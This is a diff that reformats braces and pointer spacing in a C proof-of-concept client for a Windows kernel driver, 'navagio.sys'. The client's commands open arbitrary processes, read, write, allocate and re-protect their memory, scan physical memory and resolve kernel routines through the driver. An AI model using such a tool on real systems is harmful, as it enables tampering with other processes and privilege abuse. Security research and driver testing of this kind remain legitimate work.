         int base = kind == SCAN_MEMORY ? 5 : 4;
         int pattern_arg = base - 2;
-        uint64_t values[5] = {1024, 0, 0, 0, 0};
+        uint64_t values[5] = { 1024, 0, 0, 0, 0 };
         if (argc < base || argc > base + 5) {
             goto bad_args;
         }
@@ -1423,7 +1428,8 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
             if (!args[1][0] || wcsnlen_s(args[1], 260) >= 260) {
                 goto bad_args;
             }
-        } else {
+        }
+        else {
             int start = kind == SCAN_MEMORY ? 1 : 0;
             if (!number(args[start], &address) || !number(args[start + 1], &length) || !length || length > MAX_TRANSFER || address > UINT64_MAX - (length - 1)) {
                 goto bad_args;
@@ -1484,9 +1490,10 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
         if (error == ERROR_NO_MORE_ITEMS) {
             puts("No pending event.");
             error = ERROR_SUCCESS;
-        } else if (!error) {
+        }
+        else if (!error) {
             printf("type=%lu fields=%08lx,%08lx,%08lx,%08lx\n", (unsigned long)event.type, (unsigned long)event.fields[0], (unsigned long)event.fields[1], (unsigned long)event.fields[2],
-                   (unsigned long)event.fields[3]);
+                (unsigned long)event.fields[3]);
             if (argc == 2 && !write_bytes(args[1], &event, sizeof(event))) {
                 error = ERROR_WRITE_FAULT;
             }
@@ -1509,7 +1516,7 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
         }
         break;
     case BUS: {
-        navagio_bus_config *records = NULL;
+        navagio_bus_config* records = NULL;
         error = navagio_get_bus_configs(&client, NULL, &count, &examined);
         for (i = 0; error == ERROR_INSUFFICIENT_BUFFER && i < 3; ++i) {
             if (!count || count > 4096) {
@@ -1517,10 +1524,11 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
                 break;
             }
             free(records);
-            records = (navagio_bus_config *)calloc(count, sizeof(*records));
+            records = (navagio_bus_config*)calloc(count, sizeof(*records));
             if (!records) {
                 error = ERROR_NOT_ENOUGH_MEMORY;
-            } else {
+            }
+            else {
                 error = navagio_get_bus_configs(&client, records, &count, &examined);
             }
         }
@@ -1565,11 +1573,12 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
         }
         break;
     case IMAGES: {
-        navagio_image_record *records = (navagio_image_record *)calloc(count, sizeof(*records));
+        navagio_image_record* records = (navagio_image_record*)calloc(count, sizeof(*records));
         uint32_t capacity = count;
         if (!records) {
             error = ERROR_NOT_ENOUGH_MEMORY;
-        } else {
+        }
+        else {
             error = navagio_get_image_records(&client, records, &count);
         }
         if (error == ERROR_NO_MORE_ITEMS) {
@@ -1598,7 +1607,7 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
     }
     case NMI:
     case NMI_CAPACITY: {
-        navagio_nmi_record *records = NULL;
+        navagio_nmi_record* records = NULL;
         error = navagio_get_nmi_records(&client, NULL, &count);
         if (!error) {
             error = ERROR_INVALID_DATA;
@@ -1606,11 +1615,13 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
         if (kind == NMI_CAPACITY && error == ERROR_INSUFFICIENT_BUFFER) {
             printf("required_records=%lu\n", (unsigned long)count);
             error = ERROR_SUCCESS;
-        } else if (kind == NMI && error == ERROR_INSUFFICIENT_BUFFER) {
+        }
+        else if (kind == NMI && error == ERROR_INSUFFICIENT_BUFFER) {
             if (!count || count > 4096) {
                 error = ERROR_BAD_LENGTH;
-            } else {
-                records = (navagio_nmi_record *)calloc(count, sizeof(*records));
+            }
+            else {
+                records = (navagio_nmi_record*)calloc(count, sizeof(*records));
                 error = records ? navagio_get_nmi_records(&client, records, &count) : ERROR_NOT_ENOUGH_MEMORY;
                 if (!error && !write_bytes(args[0], records, (size_t)count * sizeof(*records))) {
                     error = ERROR_WRITE_FAULT;
@@ -1626,15 +1637,18 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
     case SCAN_MEMORY:
     case SCAN_PHYSICAL:
     case SCAN_IMAGE: {
-        navagio_scan_record *records = (navagio_scan_record *)calloc(count, sizeof(*records));
+        navagio_scan_record* records = (navagio_scan_record*)calloc(count, sizeof(*records));
         uint32_t capacity = count;
         if (!records) {
             error = ERROR_NOT_ENOUGH_MEMORY;
-        } else if (kind == SCAN_MEMORY) {
+        }
+        else if (kind == SCAN_MEMORY) {
             error = navagio_scan_memory(&client, address, (size_t)length, &options, records, &count);
-        } else if (kind == SCAN_PHYSICAL) {
+        }
+        else if (kind == SCAN_PHYSICAL) {
             error = navagio_scan_physical(&client, address, (size_t)length, &options, records, &count);
-        } else {
+        }
+        else {
             error = navagio_scan_image(&client, args[1], &options, records, &count);
         }
         if (!error && !write_bytes(output, records, (size_t)count * sizeof(*records))) {
@@ -1674,8 +1688,8 @@ bad_args:
 }
 
 
-static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t *path, int *handled) {
-    const wchar_t *cmd = argv[pos++];
+static int navagio_commands_cli(int argc, wchar_t** argv, int pos, const wchar_t* path, int* handled) {
+    const wchar_t* cmd = argv[pos++];
     int remaining = argc - pos, method = 0, result = 0;
     int version = !wcscmp(cmd, L"version");
     int open = !wcscmp(cmd, L"open-process"), alloc = !wcscmp(cmd, L"alloc");
@@ -1688,7 +1702,7 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
     uint32_t pid = 0, protection = PAGE_READWRITE, old_protection = 0;
     uint64_t address = 0, length = 0, value;
     size_t size = 0, transferred = 0;
-    uint8_t *data = NULL;
+    uint8_t* data = NULL;
     poc client;
     navagio_version info;
     MEMORY_BASIC_INFORMATION memory;
@@ -1703,7 +1717,8 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
         if (remaining) {
             goto bad_args;
         }
-    } else if (record || record_id || resolve) {
+    }
+    else if (record || record_id || resolve) {
         if (remaining != 1 || (record && !pid_number(argv[pos], &pid))) {
             goto bad_args;
         }
@@ -1713,7 +1728,8 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
         if (resolve && (!argv[pos][0] || wcsnlen_s(argv[pos], 80) >= 80)) {
             goto bad_args;
         }
-    } else if (open) {
+    }
+    else if (open) {
         if (remaining < 1 || remaining > 2 || !pid_number(argv[pos], &pid)) {
             goto bad_args;
         }
@@ -1723,7 +1739,8 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
             method = 1;
         }
-    } else if (alloc) {
+    }
+    else if (alloc) {
         if (remaining < 2 || remaining > 3 || !pid_number(argv[pos], &pid) || !number(argv[pos + 1], &length) || !length) {
             goto bad_args;
         }
@@ -1734,7 +1751,8 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
             protection = (uint32_t)value;
         }
-    } else {
+    }
+    else {
         int expected = (release || query) ? 2 : write ? 3 : 4;
         if (remaining != expected || !pid_number(argv[pos], &pid) || !number(argv[pos + 1], &address)) {
             goto bad_args;
@@ -1755,7 +1773,7 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             protection = (uint32_t)value;
         }
         if (read) {
-            if (size > MAX_TRANSFER || !(data = (uint8_t *)calloc(1, size))) {
+            if (size > MAX_TRANSFER || !(data = (uint8_t*)calloc(1, size))) {
                 goto bad_args;
             }
         }
@@ -1779,37 +1797,44 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
         if (!error) {
             printf("family=%lu revision=0x%lx\n", (unsigned long)info.family, (unsigned long)info.revision);
         }
-    } else if (open) {
+    }
+    else if (open) {
         error = navagio_open_process(&client, pid, method, &process);
         if (!error) {
             DWORD actual_pid = GetProcessId(process);
             if (actual_pid != pid) {
                 error = ERROR_INVALID_DATA;
-            } else {
+            }
+            else {
                 printf("PASS process handle: PID=%lu (closed on exit)\n", actual_pid);
             }
         }
-    } else if (alloc) {
+    }
+    else if (alloc) {
         error = navagio_allocate_memory(&client, pid, &address, &size, MEM_COMMIT | MEM_RESERVE, protection);
         if (!error) {
             printf("address=0x%llx size=%zu\n", (unsigned long long)address, size);
         }
-    } else if (release) {
+    }
+    else if (release) {
         error = navagio_free_memory(&client, pid, &address, &size, MEM_RELEASE);
         if (!error) {
             puts("PASS free");
         }
-    } else if (query) {
+    }
+    else if (query) {
         error = navagio_query_memory(&client, pid, address, &memory);
         if (!error) {
             printf("base=%p allocation=%p size=%zu state=0x%lx protect=0x%lx type=0x%lx\n", memory.BaseAddress, memory.AllocationBase, memory.RegionSize, memory.State, memory.Protect, memory.Type);
         }
-    } else if (protect) {
+    }
+    else if (protect) {
         error = navagio_protect_memory(&client, pid, &address, &size, protection, &old_protection);
         if (!error) {
             printf("address=0x%llx size=%zu old_protect=0x%lx\n", (unsigned long long)address, size, (unsigned long)old_protection);
         }
-    } else if (read) {
+    }
+    else if (read) {
         error = navagio_read_memory(&client, pid, address, data, size, &transferred);
         if (!error && !write_bytes(argv[pos + 3], data, transferred)) {
             error = ERROR_WRITE_FAULT;
@@ -1817,14 +1842,16 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
         if (!error) {
             printf("PASS read: %zu bytes saved\n", transferred);
         }
-    } else if (write) {
+    }
+    else if (write) {
         error = navagio_write_memory(&client, pid, address, data, size, &transferred);
         if (!error) {
             printf("PASS write: %zu bytes\n", transferred);
         }
-    } else if (list) {
+    }
+    else if (list) {
         uint32_t count = 0, capacity = 0, i, attempt;
-        uint64_t *objects = NULL;
+        uint64_t* objects = NULL;
         error = navagio_get_process_ids(&client, NULL, &count);
         for (attempt = 0; error == ERROR_INSUFFICIENT_BUFFER && attempt < 3; ++attempt) {
             if (!count || count > 1048576u) {
@@ -1833,10 +1860,11 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
             capacity = count;
             free(objects);
-            objects = (uint64_t *)calloc(capacity, sizeof(*objects));
+            objects = (uint64_t*)calloc(capacity, sizeof(*objects));
             if (!objects) {
                 error = ERROR_NOT_ENOUGH_MEMORY;
-            } else {
+            }
+            else {
                 error = navagio_get_process_ids(&client, objects, &count);
             }
         }
@@ -1850,9 +1878,10 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
         }
         free(objects);
-    } else if (records) {
+    }
+    else if (records) {
         uint32_t count = 0, capacity = 0, i, attempt;
-        navagio_process_info *items = NULL;
+        navagio_process_info* items = NULL;
         error = navagio_get_process_records(&client, NULL, &count);
         for (attempt = 0; error == ERROR_INSUFFICIENT_BUFFER && attempt < 3; ++attempt) {
             if (!count || count > 16384u) {
@@ -1861,10 +1890,11 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
             capacity = count;
             free(items);
-            items = (navagio_process_info *)calloc(capacity, sizeof(*items));
+            items = (navagio_process_info*)calloc(capacity, sizeof(*items));
             if (!items) {
                 error = ERROR_NOT_ENOUGH_MEMORY;
-            } else {
+            }
+            else {
                 error = navagio_get_process_records(&client, items, &count);
             }
         }
@@ -1878,14 +1908,16 @@ static int navagio_commands_cli(int argc, wchar_t **argv, int pos, const wchar_t
             }
         }
         free(items);
-    } else if (record || record_id) {
+    }
+    else if (record || record_id) {
         navagio_process_info item;
         error = record ? navagio_get_process_info(&client, pid, &item) : navagio_get_process_info_by_id(&client, address, &item);
         if (!error) {
             printf("pid=%lu parent=%lu creation=%llu peb=0x%llx\nimage=%ls\n", (unsigned long)item.pid, (unsigned long)item.parent_pid, (unsigned long long)item.creation_time,
-                   (unsigned long long)item.peb, item.image_path);
+                (unsigned long long)item.peb, item.image_path);
         }
-    } else if (resolve) {
+    }
+    else if (resolve) {
         error = navagio_system_routine(&client, argv[pos], &address);
         if (!error) {
             printf("%ls=0x%016llx\n", argv[pos], (unsigned long long)address);
@@ -1913,17 +1945,17 @@ bad_args:
 
 static void usage(void) {
     puts("poc: x64 navagio.sys PoC\n"
-         "Usage: poc [--device PATH] COMMAND\n"
-         "  ping [COUNT]                 Register and validate ping replies (1..1000)\n"
-         "  exchange REQUEST RESPONSE    Send a decoded 664-byte packet file;\n"
-         "                               save the decoded reply (auto-register)\n"
-         "  --help                       Show this help");
+        "Usage: poc [--device PATH] COMMAND\n"
+        "  ping [COUNT]                 Register and validate ping replies (1..1000)\n"
+        "  exchange REQUEST RESPONSE    Send a decoded 664-byte packet file;\n"
+        "                               save the decoded reply (auto-register)\n"
+        "  --help                       Show this help");
     navagio_commands_usage();
 }
 
 
-static int report_error(const char *operation, DWORD error) {
-    wchar_t message[512] = {0};
+static int report_error(const char* operation, DWORD error) {
+    wchar_t message[512] = { 0 };
 
     FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, 0, message, (DWORD)(sizeof(message) / sizeof(message[0])), NULL);
     fprintf(stderr, "FAIL %s: Win32 %lu (0x%08lx)\n", operation, error, error);
@@ -1934,8 +1966,8 @@ static int report_error(const char *operation, DWORD error) {
 }
 
 
-static int read_packet(const wchar_t *path, navagio_packet *packet) {
-    FILE *file = NULL;
+static int read_packet(const wchar_t* path, navagio_packet* packet) {
+    FILE* file = NULL;
     int extra, ok;
 
     if (_wfopen_s(&file, path, L"rb") || !file) {
@@ -1951,8 +1983,8 @@ static int read_packet(const wchar_t *path, navagio_packet *packet) {
 }
 
 
-static int write_packet(const wchar_t *path, const navagio_packet *packet) {
-    FILE *file = NULL;
+static int write_packet(const wchar_t* path, const navagio_packet* packet) {
+    FILE* file = NULL;
     int ok;
 
     if (_wfopen_s(&file, path, L"wb") || !file) {
@@ -1965,9 +1997,9 @@ static int write_packet(const wchar_t *path, const navagio_packet *packet) {
     return ok;
 }
 
-int wmain(int argc, wchar_t **argv) {
-    const wchar_t *path = NAVAGIO_DEVICE_PATH;
-    const wchar_t *command;
+int wmain(int argc, wchar_t** argv) {
+    const wchar_t* path = NAVAGIO_DEVICE_PATH;
+    const wchar_t* command;
     poc client;
     navagio_packet packet;
     DWORD error;
@@ -2014,9 +2046,10 @@ int wmain(int argc, wchar_t **argv) {
             fputs("exchange performs registration automatically; command 0xad4 is reserved.\n", stderr);
             return 2;
         }
-    } else {
+    }
+    else {
         if (pos < argc) {
-            wchar_t *end;
+            wchar_t* end;
 
             errno = 0;
             count = wcstoul(argv[pos++], &end, 10);
@@ -2057,7 +2090,7 @@ int wmain(int argc, wchar_t **argv) {
         }
 
         printf("REPLY command=0x%08lx success=%lu; 664 decoded bytes saved\n", (unsigned long)navagio_get_u32(packet.bytes + NAVAGIO_OFF_COMMAND),
-               (unsigned long)navagio_get_u32(packet.bytes + NAVAGIO_OFF_SUCCESS));
+            (unsigned long)navagio_get_u32(packet.bytes + NAVAGIO_OFF_SUCCESS));
         goto done;
     }
 
@@ -2076,7 +2109,8 @@ done:
     error = navagio_close(&client);
     if (error) {
         result = report_error("CloseHandle", error);
-    } else if (!result) {
+    }
+    else if (!result) {
         puts("PASS close");
     }
     return result;
